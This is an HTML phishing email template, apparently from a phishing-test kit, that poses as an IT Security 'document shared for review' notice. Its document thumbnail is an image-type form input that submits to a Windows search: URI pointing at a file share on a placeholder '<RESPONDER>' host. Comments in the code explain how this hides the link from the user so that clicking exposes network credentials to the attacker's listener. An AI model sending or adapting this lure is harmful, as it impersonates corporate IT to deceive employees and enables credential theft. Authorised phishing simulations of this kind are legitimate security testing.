# SENDER_NAME: IT Security
# SUBJECT: search: URI | form input type=image (clicks image, submits to search: URI)

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f4f4f4; margin:0; padding:20px; }
        .container { max-width:600px; margin:0 auto; background:#fff; border:1px solid #e0e0e0; border-radius:8px; overflow:hidden; }
        .header { background:#005a9e; padding:20px 30px; color:#fff; }
        .header h2 { margin:0; font-size:18px; }
        .body { padding:30px; color:#333; line-height:1.6; }
        .footer { background:#f5f5f5; padding:15px 30px; font-size:11px; color:#888; border-top:1px solid #e0e0e0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h2>Document Ready for Review</h2></div>
        <div class="body">
            <p>Hello,</p>
            <p>The following document has been shared with you for review. Click the document thumbnail to open it.</p>
            <p style="text-align:center; margin:28px 0;">
                <!--
                  input type=image: renders as a clickable image, submits parent form to action= on click.
                  User sees an image (document icon), not a hyperlink.
                  The form action= contains the search: URI.
                -->
                <form action="search:query=inputimage&amp;crumb=location:\\<RESPONDER>\testshare" method="get">
                    <!-- Looks like a document/folder icon -->
                    <input type="image"
                           src="data:image/png;base64,"
                           alt="View Document"
                           width="48" height="48"
                           style="cursor:pointer;border:1px solid #e0e0e0;border-radius:4px;padding:4px;">
                    <br>
                    <span style="font-size:12px;color:#0078d4;">Q4_Report_Final.pdf</span>
                </form>
            </p>
            <p>Contact IT if you have questions about this shared document.</p>
            <p>IT Security Team</p>
        </div>
        <div class="footer">Automated document share notification.</div>
    </div>
</body>
</html>
